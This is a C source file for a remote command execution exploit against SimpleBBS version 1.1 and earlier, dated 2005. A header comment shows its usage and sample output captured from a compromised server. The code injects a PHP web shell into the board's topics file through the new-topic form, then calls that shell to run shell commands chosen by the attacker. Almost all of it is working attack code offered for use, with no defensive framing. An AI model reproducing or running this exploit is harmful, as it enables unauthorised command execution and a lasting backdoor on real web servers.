/*

SimpleBBS <= v1.1 remote commands execution in c

coded by: unitedasia v.Dec.7.2005

greetz: iloveyouma

http://geography.about.com/library/maps/blrasia.htm
http://www.lib.utexas.edu/maps/middle_east_and_asia/asia_pol00.jpg

$ gcc -o bbs bbs.c

Usage ./bbs [host] [/folder/] [cmd]

$ ./bbs www.somesite.com /simplebbs/ 'ls%20-al;w;id;pwd'

HTTP/1.1 200 OK
Date: Wed, 07 Dec 2005 15:31:07 GMT
Server: Apache/1.3.34 (Unix) mod_auth_passthrough/1.8 mod_log_bytes/1.2 mod_bwlimited/1.4 PHP/4.4.0 FrontPage/5.0.2.2635 mod_ssl/2.8.25 OpenSSL/0.9.6b
X-Powered-By: PHP/4.4.0
Connection: close
Content-Type: text/html

161||||||1|||Winning||||||0|||Willy\\\"><!--total 188
drwxrwxrwx    2 f1       f1           4096 Dec  6 17:02 .
drwxr-xr-x    7 f1       f1           4096 Nov 17  2002 ..
-rw-r--r--    1 f1       f1            916 Oct 20 09:30 WS_FTP.LOG
-rwxrwxrwx    1 f1       f1             28 Nov 17  2002 categories.php
-rwxrwxrwx    1 f1       f1            151 Dec  7 09:11 forums.php
-rwxrwxrwx    1 f1       f1              0 Nov 17  2002 index.php
-rwxrwxrwx    1 f1       f1              0 Nov 17  2002 online.php
-rwxrwxrwx    1 f1       f1            550 Nov 17  2002 options.php
-rwxrwxrwx    1 f1       f1          28098 Dec  7 10:31 posts.php
-rwxrwxrwx    1 f1       f1            151 Dec  7 09:11 temp.php
-rw-r--r--    1 nobody   nobody      87569 Dec  6 17:03 tmp.php
-rwxrwxrwx    1 f1       f1          38089 Dec  7 10:31 topics.php
 10:31am  up 195 days, 11:35,  1 user,  load average: 0.27, 0.23, 0.16
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
root     pts/1    watcher.somesite.com 11Nov05 11:52m 16:51   0.41s  -bash
uid=99(nobody) gid=99(nobody) groups=99(nobody)
/home/f1/public_html/simplebbs/data

*/


#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#define closesocket(s) close(s)

#define HTTP_PORT 80

#define DATA "name=Willy\\\"><!--<?php error_reporting(0);print `\\$_GET[cmd]`; die;?>&subject=Winning&message=i would like to know how each team finds
the perfect aerodinamic confuguration for each circuit, i mean, how they come to the conclusion of how the wings configurated.&sendTopic=Send"


/****************** MAIN *********************/

void sendpacket(char buffer[8192], int p, char host[100]);


int main( int argc, char **argv)
{

    char buffer[8192];
    char dat[8192];
    int count;

    if(argc<4)
    {
         printf("Usage %s [host] [/folder/] [cmd]\n\nSimpleBBS <= v1.1 remote commands execution in c\ncoded by: unitedasia v.Dec.7.2005\ngreetz:
iloveyouma\n",argv[0]);
         exit(1);
    }

    sprintf(dat, DATA);

    sprintf( buffer, "POST %sindex.php?v=newtopic&c=0 HTTP/1.0\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length:
%d\n\n%s\n\n\n", argv[2], argv[1], strlen(dat), dat);

    sendpacket(buffer,0,argv[1]);

    sprintf( buffer, "GET %sdata/topics.php?cmd=%s HTTP/1.0\nHost: %s\n\n", argv[2], argv[3], argv[1]);

    sendpacket(buffer,1,argv[1]);

    return count;
}

void sendpacket(char buffer[8192], int p, char host[100])
{

    struct sockaddr_in server;
    struct hostent *host_info;
    unsigned long addr;
    int sock;
    char dat[8192];
    int count;

    /* create socket */
    sock = socket( PF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror( "failed to create socket");
        exit(1);
    }

    /* Create socketadress of Server
     * it is type, IP-adress and portnumber */
    memset( &server, 0, sizeof (server));

    /* convert the Servername to a IP-Adress */
    host_info = gethostbyname( host);
    if (NULL == host_info) {
        fprintf( stderr, "unknown server: %s\n", host);
        exit(1);
    }
    memcpy( (char *)&server.sin_addr, host_info->h_addr, host_info->h_length);

    server.sin_family = AF_INET;
    server.sin_port = htons( HTTP_PORT);


    /* connect to the server */
    if ( connect( sock, (struct sockaddr*)&server, sizeof( server)) < 0) {
        perror( "can't connect to server");
        exit(1);
    }

    send( sock, buffer, strlen( buffer), 0);

    /* get the answer from server and put it out to stdout */
    if (p==1) {
      do {
          count = recv( sock, buffer, sizeof(buffer), 0);
          write( 1, buffer, count);
      }
      while (count > 0);
    }

    /* close the connection to the server */
    closesocket( sock);

}